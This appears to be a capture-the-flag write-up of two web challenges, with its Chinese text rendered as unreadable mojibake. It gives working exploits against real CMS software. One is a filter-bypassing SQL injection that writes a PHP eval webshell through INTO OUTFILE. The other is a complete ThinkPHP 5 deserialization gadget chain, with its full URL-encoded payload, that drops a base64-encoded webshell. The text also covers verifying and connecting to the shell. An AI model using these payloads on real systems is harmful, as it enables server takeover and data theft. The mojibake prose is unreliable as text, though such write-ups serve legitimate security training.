&lt;p>åœ¨é¦–é¡µ/æ–°é—»åŠ¨æ€å¤„ï¼Œå‡ ä¹Žæ‰€æœ‰çš„å¸–å­éƒ½æ˜¯hacked by xxx~~ï¼ˆæœ¬æ¥æˆ‘è¿˜ä»¥ä¸ºæ˜¯å¤šä¹ˆå¤æ‚çš„é•¿ç¯‡å¤§è®ºï¼‰~~ï¼Œåœ¨å¦‚ä½•å®‰è£…å’Œä½¿ç”¨æ¨¡æ¿è¿™ç¯‡ä¸‹æœ‰æ²¡åˆ å¹²å‡€çš„ä¸œè¥¿&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801031809386.png" alt="image-20210801031809386">&lt;/p>
&lt;p>å¦‚ä½•è®¾ç½®è¿›ç«™è¯­è¨€è¿™ç¯‡é‡Œç«Ÿç„¶æ˜¯è¿™æ ·çš„&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801032406665.png" alt="image-20210801032406665">&lt;/p>
&lt;p>è‰ çœŸæ˜¯èšŒåŸ ä½äº† å›¾ç©·åŒ•è§äº†å±žäºŽæ˜¯2333333&lt;/p>
&lt;p>æ ¹æ®è¿™äº›ï¼Œå¯ä»¥å¾—çŸ¥æ•´ä¸ªç«™æ˜¯å®Œå…¨ç§»æ¤/å¥—å£³beescmsçš„ æ‰€ä»¥æŽ¥ç€åŽ»æ‰¾å·²å­˜åœ¨çš„æ´žï¼Œå‚è€ƒï¼š&lt;a href="https://www.cnblogs.com/yuzly/p/11423384.html">Beescms_v4.0 sqlæ³¨å…¥æ¼æ´žåˆ†æž&lt;/a>&lt;/p>
&lt;p>åœ¨adminåŽåŠ å•å¼•å·ï¼Œæç¤º&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801113627407.png" alt="image-20210801113627407">&lt;/p>
&lt;p>è¡¨åæ˜¯bees_adminï¼Œæœ‰id, admin_name, admin_password, admin_purview, is_disableå…±5ä¸ªå­—æ®µ&lt;/p>
&lt;p>ç®€å•fuzzå¯çŸ¥ï¼šè¿‡æ»¤äº†ç©ºæ ¼ï¼ˆç”¨&lt;code>/**/&lt;/code>ç»•è¿‡ï¼‰ï¼ˆæˆ–è€…ç”¨&lt;code>tab&lt;/code>ç»•è¿‡ æˆ–è€…&lt;code>%0a&lt;/code>ç»•è¿‡ éƒ½å¯ä»¥ï¼‰ï¼Œè¿‡æ»¤äº†select, outfileï¼ˆåŒå†™ç»•è¿‡ï¼‰ï¼Œå¯¹å°–æ‹¬å·è½¬ä¹‰ä¸ºhtmlå®žä½“ï¼ˆç”¨hexç»•è¿‡ï¼‰&lt;/p>
&lt;pre tabindex="0">&lt;code>user=admin'/**/union/**/selselectect/**/1,2,3,4,5#
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801121138555.png" alt="image-20210801121138555">&lt;/p>
&lt;p>å›žæ˜¾æ­£å¸¸ï¼ŒæŽ¥ç€å°è¯•å†™å…¥shellï¼ˆè¿™é‡Œè¦å†™æ¸…æ¥šç»å¯¹è·¯å¾„ï¼Œåœ¨ä¸Šé¢çš„ä¸€å¼ æŠ¥é”™çš„é¡µé¢ä¹Ÿæœ‰æ‰€æç¤ºäº†ï¼‰&lt;/p>
&lt;pre tabindex="0">&lt;code>admin'/**/union/**/selselectect/**/1,2,3,4,0x3c3f3d6576616c28245f504f53545b2777756875275d293b3f3e/**/into/**/ououtfiletfile/**/'/var/www/html/wuhu.php'#
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801121645243.png" alt="image-20210801121645243">&lt;/p>
&lt;p>å¥½è€¶ï¼Œè¿žèšå‰‘æ‹¿flagå’¯&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801121853464.png" alt="image-20210801121853464">&lt;/p>
&lt;h2 id="ez_website">ez_website&lt;/h2>
&lt;blockquote>
&lt;p>ç®€å•çš„é¢˜ç›®&lt;/p>
&lt;/blockquote>
&lt;p>ä¹Ÿæ˜¯çŽ°å®žä¸–ç•Œå­˜åœ¨çš„ä¸œè¥¿ï¼Œå‚è€ƒï¼š&lt;a href="https://ma4ter.cn/2527.html">é½åšå»ºç«™ç³»ç»Ÿx1.0ä»£ç å®¡è®¡&lt;/a>&lt;/p>
&lt;p>ç›´æŽ¥ç”¨å·²æœ‰çš„é“¾å­æ‰“&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">think\process\pipes&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Windows&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$files&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[];&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$files&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">files&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$files&lt;/span>&lt;span style="color:#111">];&lt;/span> &lt;span style="color:#75715e">//$file =&amp;gt; /think/Modelçš„å­ç±»new Pivot(); Modelæ˜¯æŠ½è±¡ç±»
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">think&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">abstract&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Model&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$append&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[];&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$error&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$parent&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$output&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$modelRelation&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">parent&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$output&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">//$this-&amp;gt;parent=&amp;gt; think\console\Output;
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">append&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;xxx&amp;#34;&lt;/span>&lt;span style="color:#f92672">=&amp;gt;&lt;/span>&lt;span style="color:#d88200">&amp;#34;getError&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">//è°ƒç”¨getError è¿”å›žthis-&amp;gt;error
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">error&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$modelRelation&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// $this-&amp;gt;error è¦ä¸º relationç±»çš„å­ç±»ï¼Œå¹¶ä¸”ä¹Ÿæ˜¯OnetoOneç±»çš„å­ç±»==&amp;gt;&amp;gt;HasOne
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">think\model&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">think\Model&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Pivot&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#75af00">Model&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$output&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$modelRelation&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">parent&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#75af00">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$output&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$modelRelation&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">think\model\relation&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">HasOne&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#75af00">OneToOne&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">think\model\relation&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">abstract&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">OneToOne&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$selfRelation&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$bindAttr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[];&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$query&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$query&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">selfRelation&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">query&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$query&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">//$queryæŒ‡å‘Query
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">bindAttr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;xxx&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>&lt;span style="color:#75715e">// $valueå€¼ï¼Œä½œä¸ºcallå‡½æ•°å¼•ç”¨çš„ç¬¬äºŒå˜é‡
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">think\db&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Query&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$model&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$model&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">model&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$model&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">//$this-&amp;gt;model=&amp;gt; think\console\Output;
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">think\console&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Output&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$handle&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$styles&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$handle&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">styles&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;getAttr&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">handle&lt;/span> &lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">$handle&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">//$handle-&amp;gt;think\session\driver\Memcached
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">think\session\driver&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Memcached&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$handler&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$handle&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">handler&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$handle&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">//$handle-&amp;gt;think\cache\driver\File
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">think\cache\driver&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">File&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$options&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$tag&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">options&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>
&lt;span style="color:#d88200">&amp;#39;expire&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">3600&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;cache_subdir&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;prefix&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;path&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#39;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../runtime/temp/a.php&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;data_compress&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">tag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;xxx&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$Memcached&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">think\session\driver\Memcached&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">\think\cache\driver\File&lt;/span>&lt;span style="color:#111">());&lt;/span>
&lt;span style="color:#111">$Output&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">think\console\Output&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$Memcached&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$model&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">think\db\Query&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$Output&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$HasOne&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">think\model\relation\HasOne&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$model&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$window&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">think\process\pipes\Windows&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">think\model\Pivot&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$Output&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$HasOne&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$window&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¸Šä¼ &lt;/p>
&lt;pre tabindex="0">&lt;code>/index.php/index/labelmodels/get_label?tag_array[cfg]=O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00append%22%3Ba%3A1%3A%7Bs%3A3%3A%22xxx%22%3Bs%3A8%3A%22getError%22%3B%7Ds%3A8%3A%22%00%2A%00error%22%3BO%3A27%3A%22think%5Cmodel%5Crelation%5CHasOne%22%3A3%3A%7Bs%3A15%3A%22%00%2A%00selfRelation%22%3Bi%3A0%3Bs%3A11%3A%22%00%2A%00bindAttr%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22xxx%22%3B%7Ds%3A8%3A%22%00%2A%00query%22%3BO%3A14%3A%22think%5Cdb%5CQuery%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00model%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A30%3A%22think%5Csession%5Cdriver%5CMemcached%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A23%3A%22think%5Ccache%5Cdriver%5CFile%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00options%22%3Ba%3A5%3A%7Bs%3A6%3A%22expire%22%3Bi%3A3600%3Bs%3A12%3A%22cache_subdir%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22path%22%3Bs%3A135%3A%22php%3A%2F%2Ffilter%2Fconvert.iconv.utf-8.utf-7%7Cconvert.base64-decode%2Fresource%3DaaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g%2F..%2Fruntime%2Ftemp%2Fa.php%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7Ds%3A6%3A%22%00%2A%00tag%22%3Bs%3A3%3A%22xxx%22%3B%7D%7Ds%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7D%7D%7D%7Ds%3A6%3A%22parent%22%3Br%3A11%3B%7D%7D%7D
&lt;/code>&lt;/pre>&lt;p>è™½ç„¶ä¼šè¿”å›žä¸€ä¸ªæŠ¥é”™çš„é¡µé¢ï¼Œä½†æ˜¯å¯ä»¥åœ¨&lt;code>/index.php/index/image/headers?url=file:///var/www/html/runtime/temp/a.php12ac95f1498ce51d2d96a249c09c1998.php&lt;/code>å¤„éªŒè¯ä¸€ä¸‹æ˜¯å¦å†™ä¸Šäº†ðŸŽï¼Œæ–‡ä»¶åå­—æ˜¯&lt;code>md5('tag_'.md5($this-&amp;gt;tag))&lt;/code>ï¼Œè¿žæŽ¥å¯†ç æ˜¯ccc ç›´æŽ¥èšå‰‘&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804202819779.png" alt="image-20210804202819779">&lt;/p>
&lt;p>åœ¨&lt;a href="http://www.snowywar.top/?p=2424">é›ªæ®‡çš„wp&lt;/a>ä¸­ç”¨çš„æ˜¯å¦ä¸€ä¸ªï¼Œæ›´ç›´æŽ¥çš„å†™ðŸŽæ–¹å¼ï¼Œä¸‹é¢è¯´ä¸€ä¸‹æ€è·¯ï¼ˆå¤§æ¦‚&lt;/p>
&lt;p>æˆ‘ä»¬å¯ä»¥å…ˆå°è¯•çœ‹çœ‹æ•æ„Ÿå‡½æ•°file_put_contents()æ˜¯å¦èƒ½åˆ©ç”¨&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804212231467.png" alt="image-20210804212231467">&lt;/p>
&lt;p>åœ¨&lt;code>application/admin/controller/Upgrade.php&lt;/code>ä¸‹çœ‹åˆ°äº†æ–‡ä»¶å†™å…¥çš„å‡½æ•°ï¼Œå®ƒä½äºŽåœ¨&lt;code>writelog()&lt;/code>ä¸­ï¼Œè¿™ä¸ªå‡½æ•°çš„åŠŸèƒ½æ˜¯å¤„ç†postè¯·æ±‚ä¼ å…¥çš„å„é¡¹å‚æ•°&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804212743633.png" alt="image-20210804212743633">&lt;/p>
&lt;p>è¿™ä¸ª&lt;code>config('client_upgrade_edition')&lt;/code>æï¼Œè·Ÿäº†ä¸€ä¸‹ å®ƒä¼šè¿”å›žnullï¼Œå†å¾€ä¸Šçœ‹åˆ°&lt;code>_initialize()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210805140607537.png" alt="image-20210805140607537">&lt;/p>
&lt;p>æ‰€ä»¥æœ€åŽæ˜¯ä¼šå°†$upgrade_editionå†™å…¥ä¸­&lt;code>/runtime/client_upgrade_edtion.php&lt;/code>ä¸­ï¼›è€Œæ•´ä¸ªwritelog()å‡½æ•°ä¼šè¢«sysup()è°ƒç”¨&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804213858768.png" alt="image-20210804213858768">&lt;/p>
&lt;p>è·Ÿè¿›è¿™ä¸ªsysup()å’Œ$upgrade_edtionï¼Œçœ‹æ˜¯å¦å¯ç”¨+å¦‚ä½•ç”¨&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804220616726.png" alt="image-20210804220616726">&lt;/p>
&lt;p>åœ¨&lt;code>template/admin_style/default/admin/upgrade/index.htm&lt;/code>ä¸‹çœ‹åˆ°äº†ç¡®å®žå­˜åœ¨çš„è·¯ç”±ï¼Œè¿™ä¸ªçš„é¡µé¢æ˜¯åœ¨åŽå°ç®¡ç†ä¸­å¿ƒ - ç³»ç»ŸåŠŸèƒ½ - ç³»ç»Ÿåœ¨çº¿å‡çº§å¤„ï¼Œéšä¾¿å‡ä¸€ä¸ªçœ‹çœ‹&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804214721944.png" alt="image-20210804214721944">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804215658734.png" alt="image-20210804215658734">&lt;/p>
&lt;p>æŠ“åŒ…ä¹‹åŽçœ‹åˆ°è¿™é‡Œç¡®å®žæœ‰postè®¿é—®å’Œupgrade_edtionå‚æ•°ï¼Œé‚£å°±ç¨³äº†ï¼Œç›´æŽ¥å†™ðŸŽ&lt;/p>
